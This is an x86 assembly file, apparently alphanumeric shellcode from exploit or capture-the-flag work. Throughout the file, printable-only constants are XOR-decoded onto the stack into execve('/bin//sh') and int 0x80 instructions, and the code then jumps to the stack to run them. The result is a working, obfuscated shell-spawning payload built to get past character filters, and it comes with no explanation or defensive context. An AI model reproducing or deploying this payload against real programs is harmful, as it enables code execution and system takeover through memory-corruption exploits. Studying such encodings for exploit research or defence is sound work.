/* test.s */
    .intel_syntax noprefix
    .globl _start

_start:
    push 0x30
    pop eax
    xor al, 0x30
    push eax
    push eax
    push eax  /* edx = 0 */
    push eax  /* ebx = 0 */
    push eax
    push eax
    push eax
    push eax
    popad
    dec edx   /* edx = 0xffffffff */

    /* push 0x80cd0b42 */
    push edx
    pop eax
    xor eax, 0x30433230
    xor eax, 0x4f713972
    push eax
    push esp
    pop ecx
    xor [ecx], dh
    inc ecx
    xor [ecx], dh

    /* push 0x8de18953 */
    push edx
    pop eax
    xor eax, 0x31443030
    xor eax, 0x435a4663
    push eax
    push esp
    pop ecx
    xor [ecx], dh

    /* push 0x52e3896e */
    push 0x0
    pop eax
    xor eax, 0x31443034
    xor eax, 0x6358465a
    push eax
    push esp
    pop ecx
    inc ecx
    xor [ecx], dh
    inc ecx
    xor [ecx], dh

    /* push 0x69622f68 */
    push 0x0
    pop eax
    xor eax, 0x30304330
    xor eax, 0x59526c58
    push eax

    /* push 0x68732f2f */
    push 0x0
    pop eax
    xor eax, 0x30304343
    xor eax, 0x58436c6c
    push eax

    /* push 0x6852d231 */
    push 0x0
    pop eax
    xor eax, 0x30314141
    xor eax, 0x58636c70
    push eax
    push esp
    pop ecx
    inc ecx
    xor [ecx], dh

    jmp esp
